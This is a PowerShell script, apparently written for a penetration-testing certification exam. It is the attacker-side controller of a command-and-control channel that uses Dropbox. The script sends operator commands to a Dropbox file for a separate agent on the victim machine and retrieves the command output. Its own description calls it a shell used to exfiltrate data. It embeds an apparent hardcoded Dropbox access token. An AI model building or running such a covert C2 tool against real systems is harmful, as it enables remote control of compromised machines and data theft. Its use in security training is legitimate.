function Dropbox-c2
{
    <#

    .SYNOPSIS
    This PowerShell script is an intractive shell that uses Dropbox to exfilrate data.
    .DESCRIPTION
    This is the c2 function that run on attacker machine, you need to run Dropbox-agent on target machine.
 
     .PARAMTER Token
    It expects an access token of your Dropbox account, Or you could change the token inside the code.
    https://blogs.dropbox.com/developers/2014/05/generate-an-access-token-for-your-own-account/

    .EXAMPLE
    PS C:\> . .\Dropbox-c2.ps1
    PS C:\> Dropbox-c2
    PS C:\> Dropbox-c2 -Token "oea-uClDJ0AAAAAAAAAAC6Q8S94-xHeBb2-hLr_6oH_LruhhuuFJ1mrb6PnQMrXJ"

    .LINK
    https://blogs.dropbox.com/developers/2014/05/generate-an-access-token-for-your-own-account/
    https://www.dropbox.com/developers/documentation/http/documentation#files-download

    .NOTES
    This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam.
    " http://www.securitytube-training.com/online-courses/powershell-for-pentesters/ "
    Student ID: PSP - 3224
    #>

    [CmdletBinding(SupportsShouldProcess = $true)]
    param (

    [parameter (Mandatory = $false)]
    [string]
    $Token = "oea-uClDJ0AAAAAAAAAAC7Q8S94-xHeBb2-hLr_9oH_LruhhuuFJ1mrb1PnQMrXJ"

    )


    $HeaderCommandUP= @{
        "Dropbox-API-Arg"='{"path": "/command.txt","mode": "overwrite","autorename": true,"mute": false,"strict_conflict": false}'
        "Authorization"="Bearer $Token"
        "Content-Type"="application/octet-stream"
    } 

     $HeaderCommandDown= @{
        "Authorization"="Bearer $Token"
		"Dropbox-API-Arg"='{"path": "/output.txt"}'
        "Content-Type"="application/octet-stream"
    }

    
     $HeaderUPStatus= @{
        "Dropbox-API-Arg"='{"path": "/status.txt","mode": "overwrite","autorename": true,"mute": false,"strict_conflict": false}'
        "Authorization"="Bearer $Token"
        "Content-Type"="application/octet-stream"
    }

     $HeaderDownStatus= @{
        "Authorization"="Bearer $Token"
		"Dropbox-API-Arg"='{"path": "/status.txt"}'
        "Content-Type"="application/octet-stream"
    }
    
    $ErrorActionPreference = 'SilentlyContinue'
    $command = ""
    while ($command -ne "exit")
    {
        $command = Read-Host -Prompt "`n[command]"

        #checking if correct command
        $cmd1 = $command.Split(" ")[0]
        $cmd2 = Invoke-Expression $cmd1
        if (!$cmd2)
        {
        Write-Output "No such command"
        }
        
        elseif ($command -eq "exit")
        {
            break
        }

        else{
            #upload command
            try {
                $req = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -Body $command -Headers $HeaderCommandUP
                if ($req){
                 Write-Host "`n[+] Command uploaded Successfully" -ForegroundColor Green 
                       }
             }
            catch { 
                 Write-Host "`n[-] Something Went Wrong" -ForegroundColor Red
                  }

            # upload Status
            try {
            $req = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -Body "Wating for output" -Headers $HeaderUPStatus
            if ($req){
                Write-Host "`n[+] Wating for Output" -ForegroundColor Green 
                    }
             }
            catch { 
                 Write-Host "`n[-] Something Went Wrong`n" -ForegroundColor Red
                  }

            #Check Status and Download output
            try {
                $request_permission = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/download -Method Post -Headers $HeaderDownStatus
                while ($request_permission -ne 'Output is ready')
                    {
                    Start-Sleep -s 5
                    $request_permission = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/download -Method Post -Headers $HeaderDownStatus
                    if ($request_permission -eq 'Output is ready'){
                        $output = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/download -Method Post -Headers $HeaderCommandDown
                        Write-Host "`n[+] Command Output:`n $output" -ForegroundColor Green
                        break
                        }
                    }

                 }
            catch { 
                 Write-Host "`n[-] Something Went Wrong`n" -ForegroundColor Red
                  }
              }
        }

}
